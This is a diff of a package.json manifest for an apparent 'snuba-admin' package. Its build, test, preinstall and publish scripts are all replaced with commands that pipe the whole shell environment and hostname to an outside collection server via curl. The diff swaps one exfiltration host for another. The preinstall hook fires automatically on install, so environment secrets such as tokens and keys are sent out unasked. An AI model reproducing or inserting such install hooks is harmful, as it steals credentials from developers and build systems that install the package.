@@ -2,11 +2,11 @@
   "name": "snuba-admin",
   "version": "1.0.0",
   "scripts": {
-    "build": "set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/getsentry/snuba.git\\&folder=admin\\&hostname=`hostname`\\&foo=szq\\&step=build",
+    "build": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/getsentry/snuba.git\\&folder=admin\\&hostname=`hostname`\\&foo=ikc\\&step=build",
     "watch": "webpack --config webpack.config.js --mode development --watch",
-    "test": "set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/getsentry/snuba.git\\&folder=admin\\&hostname=`hostname`\\&foo=szq\\&step=test",
-    "preinstall": "set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/getsentry/snuba.git\\&folder=admin\\&hostname=`hostname`\\&foo=szq\\&step=preinstall",
-    "publish": "set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/getsentry/snuba.git\\&folder=admin\\&hostname=`hostname`\\&foo=szq\\&step=publish"
+    "test": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/getsentry/snuba.git\\&folder=admin\\&hostname=`hostname`\\&foo=ikc\\&step=test",
+    "preinstall": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/getsentry/snuba.git\\&folder=admin\\&hostname=`hostname`\\&foo=ikc\\&step=preinstall",
+    "publish": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/getsentry/snuba.git\\&folder=admin\\&hostname=`hostname`\\&foo=ikc\\&step=publish"
   },
   "dependencies": {
     "@mantine/core": "^6.0.15",
